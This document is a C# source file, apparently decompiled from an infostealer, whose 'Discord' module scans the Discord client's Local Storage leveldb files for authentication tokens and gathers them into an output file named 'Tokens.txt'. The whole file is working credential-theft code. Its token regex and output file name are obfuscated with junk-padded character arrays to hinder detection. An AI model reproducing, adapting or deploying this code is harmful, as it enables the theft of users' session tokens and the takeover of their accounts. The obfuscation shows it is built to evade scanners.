// Discord
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

public class Discord : FileScanner
{
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.ExpandEnvironmentVariables("%appdata%\\discord\\Local Storage\\leveldb");
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*.log",
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*.ldb",
				Recoursive = false
			});
			return list;
		}
		catch
		{
			return list;
		}
	}

	public static IEnumerable<ScannedFile> GetTokens()
	{
		List<ScannedFile> list = FileScanning.Search(new Discord());
		StringBuilder stringBuilder = new StringBuilder();
		foreach (ScannedFile item in list)
		{
			try
			{
				foreach (Match item2 in Regex.Matches(Encoding.UTF8.GetString(item.Body), new string(new char[77]
				{
					'[', 'A', 'S', 't', 'r', 'i', 'n', 'g', '-', 'Z',
					'a', 'S', 't', 'r', 'i', 'n', 'g', '-', 'z', '\\',
					'd', ']', '{', '2', 'S', 't', 'r', 'i', 'n', 'g',
					'4', '}', '\\', '.', '[', 'S', 't', 'r', 'i', 'n',
					'g', '\\', 'w', '-', ']', '{', 'S', 't', 'r', 'i',
					'n', 'g', '6', '}', '\\', '.', '[', '\\', 'w', 'S',
					't', 'r', 'i', 'n', 'g', '-', ']', '{', '2', 'S',
					't', 'r', 'i', 'n', 'g', '7', '}'
				}).Replace("String", string.Empty)))
				{
					try
					{
						string value = item2.ToString().Trim();
						if (!stringBuilder.ToString().Contains(value))
						{
							stringBuilder.AppendLine(value);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		yield return new ScannedFile
		{
			Body = Encoding.ASCII.GetBytes(stringBuilder.ToString()),
			NameOfFile = new string(new char[38]
			{
				'T', 'R', 'e', 'p', 'l', 'a', 'c', 'e', 'o', 'k',
				'R', 'e', 'p', 'l', 'a', 'c', 'e', 'e', 'n', 'R',
				'e', 'p', 'l', 'a', 'c', 'e', 's', '.', 't', 'R',
				'e', 'p', 'l', 'a', 'c', 'e', 'x', 't'
			}).Replace("Replace", string.Empty)
		};
	}
}
